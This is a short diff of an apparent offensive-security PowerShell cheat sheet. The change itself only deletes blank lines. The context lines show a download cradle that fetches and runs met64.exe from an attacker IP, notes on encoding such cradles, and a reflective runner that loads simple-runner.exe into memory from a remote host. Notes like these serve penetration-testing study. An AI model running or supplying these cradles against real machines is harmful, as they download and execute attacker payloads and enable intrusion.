@@ -20,7 +20,6 @@ Download cradle in memory:
 powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.186/met64.exe', 'C:\Windows\Tasks\met64.exe'); C:\Windows\Tasks\met64.exe
 ```
 
-
 #ps1 #encoding #cradle
 Encode download cradle:
 ```powershell
@@ -46,8 +45,6 @@ $hexDll | Out-File C:\Users\Administrator\Desktop\hex.txt
 ```
 
 ^6217c2
-
-
 #ps1 #reflection #runner 
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.155/simple-runner.exe')
